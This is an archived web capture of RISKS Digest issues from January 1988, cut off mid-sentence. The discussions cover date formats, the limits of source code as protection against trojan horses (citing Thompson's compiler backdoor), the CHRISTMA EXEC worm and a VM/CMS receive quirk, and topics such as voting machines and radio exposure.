   Date formats
</A>
</H3>
<address>
"ZZASSGL" 
&lt;<A HREF="mailto:ZZASSGL@CMS.UMRCC.AC.UK">
ZZASSGL@CMS.UMRCC.AC.UK
</A>&gt;
</address>
<i>
Tue, 05 Jan 88 10:00:02 GMT
</i><PRE>

Happy New Year to All - Except those program designers whose systems print
dates in the form such as 5/1/88. Now as far as I'm concerned this translates
to 5th January 1988, but then I live in England.  In North America I believe
that it would be the 1st May 1988.  The problems start when I have to use
programs designed in America on a computer situated in the UK - especially
during the first few days of each month when dates such as 5/6/88 occur!

If we must make a resolution for the new year, lets all promise to specify
the name of the month rather than its ordinal in all our programs.

Geoff Lane
UMRCC

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Risks of Not Using Social Security Numbers
</A>
</H3>
<address>
Bruce Baker 
&lt;<A HREF="mailto:BNBaker@kl.sri.com">
BNBaker@kl.sri.com
</A>&gt;
</address>
<i>
Tue 5 Jan 88 14:46:53-PST
</i><PRE>

The items about social security numbers reminded me of a series of computer
and administrative problems that arose at Boston College in the early 70s
when it was decided that students would no longer be identified by social
security numbers (nor by any other number!).  

Of course, all sorts of batch accounting and record keeping programs  depended
on a student number for processing.  So, a unique number was assigned to each
student unbeknownst to him/her.  Moreover, a mapping program was necessary to
relate the "secret" number to the social security number of students who had
enrolled before the ban.  When problems arose, it was tempting to let a student
know his/her number so that it would not happen again.  I believe they finally
decided to let all students know their numbers and that they began placing the
numbers on student IDs, because too many problems arose.  And, of course, many
students did not want to memorize another number and would have preferred the
old system.

MORAL:  Social security numbers as general-purpose identification numbers may
be less painful than the alternatives.


As long as I am delving into the fuzzy past, here are two more items that 
perhaps deserve to be in the RISKS history book.  Please excuse me if I do not
have perfect recall.


Subject:  Risks of Computers Obeying Newton's Laws

Around the mid-sixties, the Air Force ordered a Honeywell computer for delivery
to Rhein Main Air Force Base.  As I recall, it was about a million dollar 
computer.  When it arrived in the middle of the night at Rhein Main, no 
Honeywell people nor supply officers were on hand to oversee the unloading.
The computer was supposedly tied down to one of those material handling flatbed
vehicles that has a series of rollers on its surface.  You guessed it!  As the
driver turned to enter a hanger, the computer kept going straight ahead.

I heard that Honeywell was secretly happy because they did not expect to sell
many of these computers.  Now they had doubled their sales.

MORAL:  Computers are subject to the same laws of physics as other types of
cargo.


Subject:  Risks of Not Employing Configuration Management for Computer Software

Another one from the mid-sixties.  ---  A command and control system was 
developed by GE (I believe) for use at Ramstein Air Force Base.  The system 
deployed tactical aircraft during alerts.  However, the controllers in the
control center trusted their own judgments more than they trusted the system.

Nonetheless, over several years, various people tinkered with the hardware and
software and then rotated to other assignments.  GE techreps were also cut back
drastically during that period when the military did not wish to become 
dependent on contractor personnel in an operational environment.  Configuration
management documentation of changes was nonexistent.  A new commander decided
to use the system and so the first problem was to determine what they had.
Logically, they asked GE.  From what I understand, the GE proposal to 
inventory, analyze, and document the configuration was over $1 million.  Some
thought that GE took advantage of the situation but ......

MORAL:  One-of-a-kind systems require the same principles of configuration
management as systems that are produced in the thousands.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
 Source code not a defense
</A>
</H3>
<address>
&lt;<A HREF="mailto:TMPLee@DOCKMASTER.ARPA">
TMPLee@DOCKMASTER.ARPA
</A>&gt;
</address>
<i>
Mon, 4 Jan 88 22:26 EST
</i><PRE>

Regarding the comment in Risks 6.2 about being safe from virus if one has
the source code -- I might remind people to re-read Ken Thompson's paper
[Turing award lecture, Reflections on Trusting Trust, CACM 27, 8, August
1984] wherein the concept of an invisible virus was proposed -- the actual
virus was (to be) buried in the object code of the C compiler for Unix; its
object was that IF it were compiling the source code of the login module it
would insert a little piece of code that allowed it's creator always to log
on (the War Games "backdoor"); IF it were compiling the source code of the C
compiler itself it would merely copy itself at the appropriate place.  In
both cases there was no sign of the virus in the source code nor presumably
in the listing generated by the compiler; I don't know Unix much, but one
could also hypothesize the virus as also being clever enough to recognize
when it was compiling whatever standard debuggers and decompilers come with
the system as to insert in them code that made them protect (somehow mask a
user from seeing) the pieces of the virus in the object code if those tools
were used to look at object code.  Here a user could inspect the entire
source code of the system (or so he thought) and not find anything; if the
initial virus went out in very early versions of the compiler there would be
little chance of a user finding any uncontaminated ones with which to
compile the source code he was given.

(I stand neutral on whether such a virus was actually created and
released on the world; I don't know and the folklore has it both ways.
But that's not the point.)

    [Please be prepared for a LOT OF OVERLAP in the next few messages.
    Since this is such a popular topic, I'm not going to try to edit.
    Just omit the rest if you're fed up with this topic.  On the other
    hand, some very important points are being made, and the repetition
    may be in order to counteract some of the more simplistic views.  PGN]

</PRE>
<HR><H3><A NAME="subj4.2">
Source code vs. attacks
</A>
</H3>
<address>
Chris Torek 
&lt;<A HREF="mailto:chris@mimsy.umd.edu">
chris@mimsy.umd.edu
</A>&gt;
</address>
<i>
Tue, 5 Jan 88 09:43:16 EST
</i><PRE>

"guthery%asc@sdr.slb.com" claims

&gt;... there is no protection in trying programs out with 
&gt;write-only harddisks or with privileges turned off.

Perhaps not.  It is, however, easy to show that if *no* state is
retained between the execution of one program and the execution of
another, the former program cannot affect the latter.  (Take away
its tape and a turing machine can no longer compute.)  This is a
very expensive solution, and infeasible for most people.

  [Another plug for Ken Thompson omitted...]

&gt;There are NO good reasons why software vendors shouldn't give you
&gt;the source code of any program they sell you.

(I daresay this depends on one's definition of a `good reason'....)

&gt;The reason they don't currently is because you could see what a mess
&gt;the program really is.

No doubt that is one reason.  Having in times of need disassembled
various programs back to source, I will agree that many are poorly
written.  I doubt that is the only, or even the main, reason most
vendors are unwilling to distribute sources.  (It is rather fun,
actually, to call a vendor and say: `Will you still not sell source?
Very well.  By the way, there is a bug in your leap year code.
Also, you left out a ``#'' in the startup routine where . . . .')
But this is all beside the point.  (Ah, yes, the *point*:)

&gt;As long as we willing to accept programs from software suppliers
&gt;without the source code we, irresponsibly in my view, accept undue
&gt;risk and invite disaster.

What, then, are we to do?  Form a software users' union?  (I am
only half joking.)  I would very much appreciate receiving source
code to the binaries I must run.  The vendors remain unwilling to
sell the code, and we do not have the time to write the software
ourselves.  We have no alternate suppliers who will sell source.
The only remaining option seems to be not to run the code at all.

In-Real-Life: Chris Torek, Univ of MD Comp Sci Dept (+1 301 454 7690)
Domain:	chris@mimsy.umd.edu	Path:	uunet!mimsy!chris

</PRE>
<HR><H3><A NAME="subj4.3">
Knowing Source Code is not Sufficient
</A>
</H3>
<address>
William Smith
&lt;<A HREF="mailto:wsmith@b.cs.uiuc.edu ">
wsmith@b.cs.uiuc.edu 
</A>&gt;
</address>
<i>
Tue, 5 Jan 88 15:26:19 CST
</i><PRE>

&gt;		     IF YOU CAN'T READ IT, DON'T RUN IT

Unfortunately, this is not sufficient if the vendor of your software is not
trustworthy.  Ken Thompson's Turing Award Lecture in 1983 [CACM, Aug. 1984]
described how bugs not in the source code can end up in the executable.
Even if you compile every program given you, something must assemble or
compile the compiler.  Something must assemble that, etc., etc.  Unless you
are willing to bootstrap your software from the raw bits using source code
that you trust as an assistant during the bootstrap, there still may be
trojan horses.

From the lecture: "No amount of source-level verification or scrutiny will 
protect from using untrusted code.... A well-installed microcode bug
will be almost impossible to detect."

When you buy a tool such as an automobile, you do not ask to see all of the 
engineering drawings and analyses to decide that the car is safe.  An 
amount of trust is necessary when using any technology.  Computers are 
general purpose tools and as such can hide many different faults.  If the 
source of the hardware or software is trustworthy, there should be fewer faults
and fewer still malicious faults.  The relative ease with which a single
employee can insert hidden bugs demostrates that care should be taken
in determining who is trustworthy.

Bill Smith, pur-ee!uiucdcs!wsmith, wsmith@a.cs.uiuc.edu

</PRE>
<HR><H3><A NAME="subj4.4">
Re: Source Code is Counter to Viruses &amp; Trojan Horses
</A>
</H3>
<address>
&lt;<A HREF="mailto:Tom.Lane@zog.cs.cmu.edu">
Tom.Lane@zog.cs.cmu.edu
</A>&gt;
</address>
<i>
Tuesday, 5 January 1988 11:13:58 EST
</i><PRE>
Summary: No it ain't

In reply to guthery%asc@sdr.slb.com, who writes in RISKS 6.2:
&gt;There are NO good reasons why software vendors shouldn't give you the source
&gt;code of any program they sell you.

On the contrary, there are several good reasons.  Some of them have to do
with commercial advantage, i.e., not having one's work ripped off.  If Mr.
Guthery believes that this is not a legitimate concern, he obviously does
not make his living by selling software.

There is also a good technical reason: VERSION CONTROL, for purposes of
customer support.  Tech support is difficult and time-consuming enough when
one knows exactly what software the customer is running.  Shipping source
code is an open invitation to the customer to tweak the software to suit his
purposes --- but he will still expect the vendor to support that software,
answer questions about its behavior, track down bugs (possibly induced by
customer changes), etc.  The RISK introduced by source code distribution is
that program changes will be made by customers who don't fully understand
the program; we all know what that leads to.


On the original topic, Mr. Guthery's main argument was that source code
distribution would allow customers to inspect for trojan horses.  I don't
believe this; in large programs it is not difficult to hide trojan horse
code well enough to defeat even careful inspection.  Besides, he can't
seriously propose that no one ever run a program that they haven't
personally (or even corporately) studied; no one would ever get any useful
work done.  (Have you personally checked over every line in your operating
system lately?)

Moreover, source code distribution means that more people have a chance to
diddle the program!  Even if the original author is reliable, what about all
the people at the user's site?  Access to source code makes it *much* easier
to create a trojan horse version of a program.  Another way to put this is:
even if you've seen the source code, how do you know it matches the bits
you're executing today?

I don't know the solution to trojan horse attacks, but source code
distribution is not it.
				tom lane

ARPA: lane@ZOG.CS.CMU.EDU
UUCP: &lt;your favorite arpanet gateway&gt;!zog.cs.cmu.edu!lane
BITNET: lane%zog.cs.cmu.edu@cmuccvma

</PRE>
<HR><H3><A NAME="subj4.5">
Source Code is *not* Counter to Viruses &amp; Trojan Horses
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: 05 Jan 88 09:59:11 PST (Tue)

I would like to comment on the assumption that having source will
protect you from Trojan Horses.  While this is frequently true, a
recent Turing Award Lecture has pointed out that it's not in general
true, because of the compiler bootstrapping problem.  The case made is
that a compiler can be written which detects attempts to recompile the
compiler and inserts code which detects attempts to compile the login
program and inserts code in that which allows bogus logins, as well as
replicating the code which modifies the compiler binary.  The
system is then shipped with the binary of the trojan horse compiler
and the source for the valid compiler.  Even when you completely
rebuild the system from sources you still get the compiler and login
program with the trojan horse.  Nothing short of dissassembly of the
original compiler or using an outside compiler will work, and using an
outside compiler usually isn't feasible.

At some point you have to trust somebody.

</PRE>
<HR><H3><A NAME="subj4.6">
Viruses and sources
</A>
</H3>
<address>
Don Chiasson 
&lt;<A HREF="mailto:G.CHIASSON@DREA-XX.ARPA">
G.CHIASSON@DREA-XX.ARPA
</A>&gt;
</address>
<i>
Tue, 5 Jan 88 17:21:31 AST
</i><PRE>
Cc: guthery%asc%sdr.slb.com%RELAY.CS.NET@DREA-XX.ARPA, G.CHIASSON@DREA-XX.ARPA

 &gt;From: "guthery%asc@sdr.slb.com" &lt;GUTHERY%ASC%sdr.slb.com@RELAY.CS.NET&gt;
 &gt;Subject: Source Code is Counter to Viruses &amp; Trojan Horses
 &gt;.. there is no protection in trying programs out with write-only harddisks 
 &gt; or with privileges turned off.  Doing this only sets the hook deeper.  
     Running a program with write protection and restricted privileges
does give limited protection which is better than no protection. 
 &gt; .. anytime you run a program whose complete workings you do not ... 
 &gt; understand you are  ... at risk.
     Agreed.  But very few people completely understand any program.
 &gt; One ... way to counter viruses and trojan horses is to insist on getting
 &gt; the source code ... IF YOU CAN'T READ IT, DON'T RUN IT
     True, if you read it.  Reading and understanding source code for a non
trivial program is very difficult.  Don't forget that you would also have
to read the source code for the compiler, linking loader and run time
libraries.  I haven't the time. 
 &gt; There are NO good reasons why software vendors shouldn't give you the source
 &gt; code of any program they sell you.  The reason they don't currently is 
 &gt; because you could see what a mess the program really is.  ...
     There are lots of good reasons for not giving source code.  One is
that it is easier to break protection of programs if source code is
available.  Another is cost: source code is more expensive to distribute
than binaries, especially when required documentation is included.  It
might also be necessary to supply compilers, etc.  (Also with source code.)
For example, DEC has written a lot of programs in BLISS which is a product
(translation: you pay for BLISS).  There is a major RISK to the company
that the user will "improve" the product.  If these "improvements" add
bugs, whose fault is it and how easy is it to prove?  Vendors also worry
that giving source code will make the job of pirates much easier.  When
vendors do supply source code, they are often reluctant and charge heavily
for it.
 &gt; In 999 cases out of 1,000 they don't know everything the program does 
     Do you think you will do better than the supplier?  
 &gt; ... think of all the execute only software you run ... [,] all the
 &gt; companies from whom you purchased this software ...[and] all the
 &gt; pressure you put on them for bug fixes, new features, and lower prices.
 &gt; Think about the translation of these pressures into pressures on
 &gt; programmers.  Suppose one of these programmers decides to get .. even.
     Sure, this is a risk.  But who do you trust? If you do all the checking
yourself you may not have time to do anything else.  Delegate the job to
someone else at your organization? Do you have the extra people? How do you
know to trust them? Managing source code is a major task.  A vendor will
normally have quality controls in place.  If you buy software, there are
lots of other copies of the program running elsewhere and bugs (including
viruses, trojan horses) are more likely to be found.  In certain cases such
as banks or defence applications it may be necessary to do source checks to
verify the code, but doing so is very expensive and for most users not
worth the cost.  Finally, it is much easier to create (better!) viruses,
etc if source code is available than if not.
     We may be talking from different directions: I am a user, perhaps you
are a hacker.  If that is so, then our approaches to protection will be
different.  My feeling is that if I don't know what it is at some level of
confidence, I won't run it. 
     You will never stop a dedicated crook: all you can do is make his/her
job harder based on an assessment of the risk vs the cost of protection.  I
feel the cost of source checking is very high.  Any protection system,
computer or otherwise, will only guard against people who are basically
honest, or lazy, or of limited competence, or with limited time.  The
majority of people fall under one of more of these categories.  Limited
measures will cut out the vast majority of threats.
                    Don

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
     Christmas virus plus
</A>
</H3>
<address>
Jeffrey R Kell 
&lt;<A HREF="mailto:JEFF%UTCVM.BITNET@CUNYVM.CUNY.EDU">
JEFF%UTCVM.BITNET@CUNYVM.CUNY.EDU
</A>&gt;
</address>
<i>
Tue, 05 Jan 88 08:44:54 EDT
</i><PRE>

Risks 6.2 contained the two comments about the Christmas virus:
   ---
&gt;From: "guthery%asc@sdr.slb.com" &lt;GUTHERY%ASC%sdr.slb.com@RELAY.CS.NET&gt;
&gt;             IF YOU CAN'T READ IT, DON'T RUN IT
   ---
&gt;From: bryce%hoser.Berkeley.EDU@ucbvax.Berkeley.EDU (Bryce Nesbitt)
&gt;I'm surprised nobody has mentioned this:  Around here we don't "execute"
&gt;shar files to unpack them.  Instead there is a handly little utility called
&gt;"unshar".  I use a version on both Unix and my Amiga microcomputer.
   ---

The problem is compounded on IBM VM/CMS systems (where CHRISTMAs EXEC took
its toll) by an often overlooked "feature" of the standard IBM "receive"
command.  Files such as EXECs are usually sent in a special encoded form
called NETDATA format.  The "receive" command is smart enough to determine
the format of the file and decode it appropriately, as is the "peek" command
used to browse a file before receiving it.  BUT... the NETDATA encoding also
allows for multiple files to be combined into one NETDATA stream.  The file
appears with only the attributes of the first file in the stream, and only
the first file appears when "peeked".  When the unsuspecting victim performs
the "receive", the remaining files are ALSO received with REPLACE IMPLIED!

Building such a "nested" NETDATA deck is not common knowledge, but can be
done using the undocumented internal module used by sendfile/receive.  The
now infamous CHRISTMA EXEC could just as easily contained a PROFILE EXEC
behind it that would format your A-disk the next time you logged on.  Thus
even if you did read the source code for CHRISTMAs and trashed it upon
discovery of its function, your next logon would result in erasure of your
entire A-disk (and also any evidence of what caused it to occur).

There is a semi-public-domain overlay for RECEIVE available on any Bitnet
NETSERV server which detects multiple datasets in a NETDATA stream.  Any
concerned IBM CMS user out there should investigate this utility.

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
Unshar program (was: Viral VAXination [Risks 6.2])
</A>
</H3>
<address>
Brent L. Woods
&lt;<A HREF="mailto:ahh@j.cc.purdue.edu ">
ahh@j.cc.purdue.edu 
</A>&gt;
</address>
<i>
Tue, 5 Jan 88 9:14:35 EST
</i><PRE>
Cc: ahh@j.cc.purdue.edu

In Risks 6.2 bryce@hoser.Berkeley.EDU (Bryce Nesbitt) writes:

&gt;I'm surprised nobody has mentioned this:  Around here we don't "execute"
&gt;shar files to unpack them...

     This probably should have been mentioned earlier, as I'm sure it's
of interest to quite a few people.  I can't speak for either the
comp.sources.unix or comp.sources.misc archives (though, as a side note,
I couldn't find any unshar programs in the comp.sources.unix archive
that is maintained here at Purdue), but there *is* an unshar program in
the comp.sources.amiga archives.  I'm not absolutely certain, but I
believe that the version we have is the one that Bryce was writing about
above.

     If anyone might want a copy of this program source code (in C),
it's available via anonymous ftp from j.cc.purdue.edu in the amiga
source archives (the directory it's in is news/comp/sources/amiga/volume1,
and the filename is unshar.c.Z).  It's written with portability in mind,
so it should compile and run under a variety of systems, but we've only
tested it under UNIX and on the Amiga so far.  Also, the file in the
archives is compressed (UNIX "compress" utility), so ftp should be set
to "binary" mode to insure a correct transfer.

Brent Woods, Co-Moderator, comp.{sources,binaries}.amiga

USENET:   ...!j.cc.purdue.edu!ahh       ARPANET:  ahh@j.cc.purdue.edu
BITNET:   PODUM@PURCCVM

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.02.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.04.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-40</DOCNO>
<DOCOLDNO>IA012-000130-B023-200</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.4.html 128.240.150.127 19970217014935 text/html 19766
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:48:03 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 4</TITLE>
<LINK REL="Prev" HREF="/Risks/6.03.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.05.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.03.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.05.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 4</H1>
<H2> Wednesday, 6 January 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
PCs die of New Year Cerebration 
</A>
<DD>
<A HREF="#subj1.1">
Scot E. Wilcoxon
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  More on Missouri Voting Decision 
</A>
<DD>
<A HREF="#subj2.1">
Charles Youman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Market for prankster programs? 
</A>
<DD>
<A HREF="#subj3.1">
Geoff Goodfellow
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Ham radio operators and cancer 
</A>
<DD>
<A HREF="#subj4.1">
Mark Fulk
</A><br>
<A HREF="#subj4.2">
 Steve Philipson
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Getting into ATM rooms 
</A>
<DD>
<A HREF="#subj5.1">
Mark A. R.
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Re: Knowing Source Code is not Sufficient 
</A>
<DD>
<A HREF="#subj6.1">
Michael Wagner
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Trust and quoting and write-only hard disks 
</A>
<DD>
<A HREF="#subj7.1">
Michael Wagner
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
PCs die of New Year Cerebration
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
Tue, 5 Jan 88 23:35:36 CST
</i><PRE>
From: sewilco@datapg.mn.org (Scot E. Wilcoxon)

One of my clients has just reported to me that a certain brand of
PC-compatibles which they sold in 1984 suddenly stopped working when 1988
was reached.  They were flooded with calls on Monday and the manufacturer of
the equipment also got many reports then.

If your PC-compatible suddenly stopped working on New Years' Day and the first
letter of its name is "S", you may want your dealer to check for this unlikely
problem.

Scot E. Wilcoxon	sewilco@DataPg.MN.ORG	ihnp4!meccts!datapg!sewilco
Data Progress		C and UNIX consulting	+1 612-825-2607

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
More on Missouri Voting Decision
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>

</i><PRE>
Date: Wed, 06 Jan 88 09:52:53 EST
From: Charles Youman (youman@mitre.arpa) &lt;m14817@mitre.arpa&gt;
Organization: The MITRE Corp., Washington, D.C.

Thanks to my mother-in-law and the USPS, I now have the article I mentioned
in RISKS 5.84.  The article is from the December 24, 1987 edition of the
St. Louis Post-Dispatch.  The page 1 article is titled "Decision Threatens
Punch-Card Elections" and is quoted without permission.

"If a federal judge's order this week is upheld, it could eliminate the punch-
card voting system, throw elections here [i.e., in Missouri] into chaos and 
cost taxpayers missions of dollars, election officials said Wednesday.

But civil-rights groups hailed the decision as a landmark that they say will
increase the participation of blacks in elections.

U.S. District Judge William L. Hungate ordered Tuesday that the St. Louis
Election Board 'take appropriate steps' for a manual count of ballots that
are cast but uncounted by the city's automatic tabulating equipment due to
such problems as double voting in one category and not pushing the pin all
the way through the ballot.

Representatives of the Election Board criticized Hungate's ruling and said
they expected it to be overturned on appeal...

Garvin [an attorney for the board] said the board might ask the 8th U.S.
Circuit Court of Appeals to postpone the effect of Hungate's order until after 
the Missouri presidential primary March 8.

The punch-card voting system is used throughout Missouri.  But Garvin said
he thought no other jurisdiction would follow Hungate's ruling unless it
was affirmed on appeal...

In the judge's order, he said it was not the punch-card voting system but
the board's actions that violated federal voting laws.  But election officials
said the ruling could have the same effect...

Punch-card voting accounted for 70 percent of the votes in the last 
presidential election in Missouri.

Hungate gave his order in a suit filed by Michael V. Roberts, an unsuccessful
candidate in the primary March 3 for the president of the St. Louis Board
of Aldermen.  Roberts, who is black, lost by 171 votes to Thomas A. Villa,
who is white.

Roberts claimed the punch-card voting system discriminated against blacks
because most of the votes cast but not counted by the Election Board's 
computers came from wards where most of the voters are black.

In his order Tuesday, Hungate said the board's failure to review by hand
ballots left uncounted by the machines violated the federal Voting Rights
Act and resulted in the disenfranchisement of voters.

Garvin said that in most elections, a large number of voters do not vote
on every ballot issue.  He said that while the board's computers could be
programmed to identify ballots for which no votes register on some issues,
the number would be so great that it would make the punch-card system
unworkable. . .

Kenneth Warren, a political science professor at St. Louis University,
called Hungate's ruling 'devastating for the punch-card voting system;
in effect, it is doing away with the system. . .

Warren [who testified for the board at the trial] said about 60 percent
of voters in the United States used the punch-card system. . .

Miriam Raskin, the assistant executive director of the American Civil
Liberties Union of Eastern Missouri, said she was thrilled by the decision.
the ACLU had entered the case on behalf of Roberts."

Charles Youman (youman@mitre.arpa)

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Market for prankster programs?
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
6 Jan 1988 09:45-PST
</i><PRE>
From: the terminal of Geoff Goodfellow &lt;Geoff@csl.sri.com&gt;

Snippet on a software developer who wants to prove there is a
market for computer prank hacks, from PC Week, 22/29 Dec 1987, Pg 28:

    "Weirdware, a division of Mainland Machine, a software
  developer in San Luis Obisbo Calif., markets for $19.95 a
  practical joke generator it calls PC Prankster.  The software
  includes 10 pranks that the owner can play on unsuspecting
  friends or prospective enemies.

    "The pranks weren't designed to be malicious or destructive,
  said John Ames, a software engineer at Mainland Machine.  First,
  the jokester has to store one of the prank files on the intended
  victim's hard disk or boot disk.  Once that's done, the
  perpetrator can set the joke to go into action after a certain
  number of keystrokes right in the middle of whatever program the
  victim is running at the time.

   "In one joke, the figure of a huge one-eyed monster appears on
  the screen, blinks and disappears, allowing the program to resume
  operation unaltered.  Other pranks briefly scrambles the PC
  character set, or makes the monitor screen appear to be cracking.

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Ham radio operators and cancer
</A>
</H3>
<address>
&lt;<A HREF="mailto:fulk@cs.rochester.edu">
fulk@cs.rochester.edu
</A>&gt;
</address>
<i>
Wed, 6 Jan 88 10:33:34 EST
</i><PRE>

One must ask whether Milham controlled for the age of his subjects;
amateur radio is very popular among retired persons and advanced age
is one of the major risk factors for all kinds of cancer (rates go
up roughly as the 4th power of age, if I recall correctly).  Amateur
radio operators are also fairly likely to build some of their own
equipment; in the process they are exposed to the fumes of over-heated
solder flux (I remember a considerable burning sensation in my nose
when using rosin-core solder) and are exposed to considerable levels of
lead.  Finally, it seems to me that hams smoke a lot (a study would
be required to really know); and the effects would be worsened by a
tendency to spend a lot of time in a small room huddled over a Morse
code key.

With respect to power lines: I think that high-voltage long-distance
power lines were probably what was meant.  I went to high school and
college in North Carolina (location of one of the studies); it seems to
me that such power lines indeed seemed to cluster near other sorts of
cancer-causing facilities.  For example, they frequently ran near
highways (I-40 from Statesville to Morganton had power lines along its
whole length).  Furthermore, they (of course) ran mostly through rural
areas; people living near them were likely to be engaged in agriculture,
meaning the use of pesticides, meaning that they were exposed to a high
and well-documented risk of various sorts of cancer.  In North Carolina,
in particular, they would likely be growing tobacco!

This is not to say that non-ionizing radiation cannot contribute to
cancer rates, although, based on my current (lay) understanding of the
mechanisms of cancer induction, I am inclined to doubt that the effect
could be strong.  Nor do I wish to cast doubt on the meaningfulness
of all such studies: one can never control all the variables, and thus
can never prove anything beyond all doubt; however, one must certainly
control those variables which have been established to have significant
effects on one's independent variable (cancer risk in this case).

ex-WB4FLO  Mark Fulk

</PRE>
<HR><H3><A NAME="subj4.2">
Shielding (Re: RISKS-6.3)
</A>
</H3>
<address>
Steve Philipson 
&lt;<A HREF="mailto:steve@ames-aurora.arpa">
steve@ames-aurora.arpa
</A>&gt;
</address>
<i>
Wed, 6 Jan 88 11:32:45 PST
</i><PRE>

From: flatline!erict@uunet.UU.NET (eric townsend)
Date: 4 Jan 88 03:37:47 GMT
&gt; 3.  I realise that ham radio gear is not always shielded properly, etc,
&gt;    but how safe are we hackers from the stuff our 'puters put out?  ...

   Ham radio gear is usually very well sheilded.  The equipment itself may
not be the problem.  Operators are frequently in close proximity to the
transmitting antennae, and thus can be on the receiving end of a large
amount of radiated energy.  I observed this phenomenom first hand in 1973
after I had installed a new beam antenna on the roof of my house.  With the
antenna pointed in my direction, full power output would cause both
florescent and incandescent bulbs in the room to light up.  (Some specifics:
appx. 800 watts output into a 9 db gain beam located about 20 feet higher and
30 feet away from my location.) I found the effect quite disconcerting and 
avoided high transmission power levels in my direction.

   This may seem an unusually high level of exposure, but it is far more
common than most people realize.  What is important is not total power
but power density.  Hand held portable radios are widely used now, in
public service and private operations alike. Typically, these radios use 
"rubber duck" antennae that are mounted to the top of the unit, only inches
from the eyes.  At this distance, power densities are quite high, even with
power output levels below 5 watts. Some reports have pointed to increased 
risk of glaucoma from use of these radios.

   As far as home computers go, the risk is probably very small.  About
two years ago both the SIGGRAPH and SIGCHI groups of ACM ran technical
sessions in their national conferences on the human factors / risks
involved in using computer displays.  For reasonably modern equipment,
the emmitted radiation levels were typically less than background levels.
As an example, broadcast radio stations several miles away showed up 
in spectrum analysis at power density levels much higher than CRTs at
the screen surface.  More significant risks from the use of computer
